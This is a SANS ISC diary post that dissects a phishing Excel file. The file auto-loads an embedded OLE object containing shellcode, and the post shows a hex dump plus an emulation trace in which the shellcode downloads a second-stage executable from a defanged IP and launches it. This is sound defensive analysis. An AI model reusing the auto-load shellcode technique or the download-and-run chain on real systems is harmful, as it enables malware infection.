---
title: Simple Shellcode Dissection, (Thu, Mar 16th)
url: https://isc.sans.edu/diary/rss/29642
source: SANS Internet Storm Center, InfoCON: green
date: 2023-03-17
fetch_date: 2025-10-04T09:53:22.450158
---

# Simple Shellcode Dissection, (Thu, Mar 16th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29638)
* [next](/diary/29646)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Simple Shellcode Dissection](/forums/diary/Simple%2BShellcode%2BDissection/29642/)

**Published**: 2023-03-16. **Last Updated**: 2023-03-16 06:41:02 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/Simple%2BShellcode%2BDissection/29642/#comments)

Most people will never execute a suspicious program or “executable”. Also, most of them cannot be delivered directly via email. Most antispam and antivirus solutions block them. But, then, how could people be so easily infected?

I’ll explain with the help of a file I found in a phishing campaign. The filename is “Swift23544679066.xlsx" (SHA256:421d30c99381f9fe4295c8c33d7e7278b323821c793bbe2f45d6003536871347) and is still unknown on VirusTotal. Here is a screenshot of the file opened in Excel:

![](https://isc.sans.edu/diaryimages/images/isc-20230316-1.png)

Many Excel sheets contain VBA or legacy Excel 4 macros but here.. nothing! Anyway, let’s have a look at potential OLE content:

```

remnux@remnux:/MalwareZoo/20230314$ oledump.py Swift23544679066.xlsx
A: xl/embeddings/8sJz9b3F.uBx2
A1:    919012 '\x01OLE10NaTIvE'
A2:         0 'VDYic03w91Qt'
```

This reveals that an OLE document is embedded in the Excel sheet! Let’s unzip the document and search for interesting strings:

```

remnux@remnux:/MalwareZoo/20230314/zip$ find . -type f -exec grep 0LE {} \; -ls
Binary file ./xl/embeddings/8sJz9b3F.uBx2 matches
     1793    907 -rw-rw-r--   1 501      dialout    928768 Mar 13 20:57 ./xl/embeddings/8sJz9b3F.uBx2
```

This stream is referenced in worksheets/\_rels/sheet1.xml.rels:

```

<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="../embeddings/8sJz9b3F.uBx2"/></Relationships>
```

Let’s follow the ID ‘rId3’. It’s referenced in worksheets/sheet1.xml:

```

<oleObject progId="9PrBwSjsFc8A5FCXYG4ILw5IQi20z" shapeId="1506" r:id="rId3" autoLoad="true"/></oleObjects>
```

The OLE object will be automatically used when the victim opens the document!

Let’s focus on this OLE stream now:

```

remnux@remnux:/MalwareZoo/20230314$ oledump.py Swift23544679066.xlsx -s A1 -a|head -20
00000000: 38 2B 7B 05 03 EE 69 DF  B3 B1 01 08 AC BE B8 C3  8+{...i.........
00000010: 42 BA FF F7 D0 8B 30 8B  0E BB B6 8B 9B 83 81 C3  B.....0.........
00000020: FA DB AA 7C 8B 3B 51 FF  D7 05 6F 4E 44 17 05 93  ...|.;Q...oND...
00000030: B2 BB E8 FF E0 64 37 33  D2 A3 80 04 42 00 C7 17  .....d73....B...
00000040: A9 EA 7C 40 45 85 4B 40  BD F2 58 8A 12 33 9A FB  ..|@[email protected]..
00000050: 96 EE 49 37 5E 3A 8F 2C  46 46 9D 71 54 64 B7 6F  ..I7^:.,FF.qTd.o
00000060: 16 DA DB 73 8E 71 CF 62  8B C6 F9 5E 9D 39 DC B3  ...s.q.b...^.9..
00000070: 88 79 BB FC 41 2F 35 08  88 98 1E 4B 13 30 C3 A5  .y..A/5....K.0..
00000080: D2 B6 B5 55 D8 A5 AB FB  D8 E6 C6 E0 56 6D AD FA  ...U........Vm..
00000090: 85 FB D3 60 BC 1C 6D A9  BF 41 40 49 1B 06 F2 23  ...`..m..A@I...#
000000A0: DD 6C 88 26 6C A8 18 55  3D 5F 01 02 B1 4E 97 10  .l.&l..U=_...N..
000000B0: DF C8 2B 22 0F 14 34 ED  9B 7A A8 9D 96 AD D5 05  ..+"..4..z......
000000C0: DD 34 16 9D FD 17 D0 E2  FA 94 24 24 05 EC 2D 6B  .4........$$..-k
000000D0: 8E 07 A8 F2 D7 3A 08 6B  6B 51 B5 E0 0A 04 FA 9C  .....:.kkQ......
000000E0: 9C A0 62 E8 19 20 99 D8  F4 3F 7F A5 0E 6C 7E B7  ..b.. ...?...l~.
000000F0: 32 B3 EE F7 1C CC EE E9  A6 A6 16 28 E5 74 F6 EE  2..........(.t..
00000100: 08 98 B8 27 B6 07 E9 9B  01 00 00 F2 98 B8 8A 09  ...'............
00000110: 04 54 13 DA 0A FF 45 1A  38 68 5C 7F 4F DC EB 00  .T....E.8h\.O...
00000120: 85 93 1C 1F C2 E1 E7 1C  E4 84 5E 3C FC DD E3 0E  ..........^<....
00000130: 8D 30 6D 9A D5 E3 C7 B8  FD C7 D1 3B 69 48 BE 3E  .0m........;iH.>
```

We probably have here a shellcode! How to detect this? Remember that a shellcode is like a “naked” program, it is missing a lot of useful information present in a regular executable or PE file. To be executed successfully, it must know two critical pieces of information:

1. Where is it located in memory?
2. How to resolve API calls? (To call them and perform malicious activities)

To solve the first problem, many shellcodes perform a technique called “GetEIP”. EIP is the register that contains the address of the next instruction to be executed by the CPU. There is a simple way to detect how “GetEIP” is implemented. Let's extract the stream containing the shellcode and use Didier's tool xorsearch[[1](https://blog.didierstevens.com/2014/09/29/update-xorsearch-with-shellcode-detector/)]:

```

remnux@remnux:/MalwareZoo/20230314$ oledump.py Swift23544679066.xlsx -s A1 -d >shellcode.bin
remnux@remnux:/MalwareZoo/20230314$ xorsearch -W -d 3 shellcode.bin
Found XOR 00 position 00000106: GetEIP method 3 E99B010000
Score: 10
```

How to interpret this command? xorsearch found a “GetEIP” method at offset 106 in the payload we extracted from the OLE stream. We are now ready to check our shell code and emulate it.

```

remnux@remnux:/MalwareZoo/20230314$ scdbgc /f shellcode.bin /foff 106
Loaded e05e4 bytes from file shellcode.bin
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 106
401106 E99B010000                      jmp 0x4012a6  vv
40110b F298                            repne cbw
40110d B88A090454                      mov eax,0x5404098a
401112 13DA                            adc ebx,edx
401114 0AFF                            or bh,bh

4014d4 GetProcAddress(ExpandEnvironmentStringsW)
40150c ExpandEnvironmentStringsW(%APPDATA%\DJB.exe, dst=12fb64, sz=104)
401520 GetProcAddress(CreateFileW)
40153c CreateFileW(C:\users\remnux\Application Data\DJB.exe) = 4
401556 LoadLibraryW(WinHttp)
40156c GetProcAddress(WinHttpOpen)
401578 WinHttpOpen(, 0, , , 0) = 29
401590 GetProcAddress(WinHttpConnect)
4015bb WinHttpConnect(29, 109[.]206[.]240[.]64 (40159a) , 50, 0) = 4823
4015d7 GetProcAddress(WinHttpOpenRequest)
401607 WinHttpOpenRequest(4823, GET, /KJH.exe, , , , 0) = 18be
401623 GetProcAddress(WinHttpSendRequest)
401635 WinHttpSendRequest(18be, )
401654 GetProcAddress(WinHttpReceiveResponse)
40165c WinHttpReceiveResponse()
401670 GetProcAddress(WriteFile)
401694 GetProcAddress(WinHttpQueryDataAvailable)
4016ae GetProcAddress(WinHttpReadData)
4016bb WinHttpQueryDataAvailable()
40170f GetProcAddress(CloseHandle)
401714 CloseHandle(4)
40172c GetProcAddress(GetStartupInfoW)
401736 GetStartupInfoW(12fda4)
40174d GetProcAddress(CreateProcessW)
401775 CreateProcessW( , C:\users\remnux\Application Data\DJB.exe ) = 0x1269
401789 GetProcAddress(ExitProcess)
40178d ExitProcess(0)
Stepcount 42497
```

We can now "read" what the shell code will do. Remember that a shell code must be able to resolve API call (see the second information that must be known). To achieve this, the shellcode will use the GetProcAddress() API call provided by the kernel32 DLL. We see that the shell code will resolve many interesting API codes to perform the following actions:

1. Create a file DJB.exe in %appdata%
2. Download the 2nd stage from http://109[.]206[.]240[.]64/KJH.exe
3. Dump the downloaded payload to DJB.exe
4. Create a new process and launch DJB.exe

Game over! This will happen without any popups or something to click on. But wait, how can a shellcode be executed automatically by Excel just when the document is opened? Let’s have a look at the process tree when you detonate the file in a sandbox:

![](https://isc.sans.edu/diaryimages/images/isc-2023...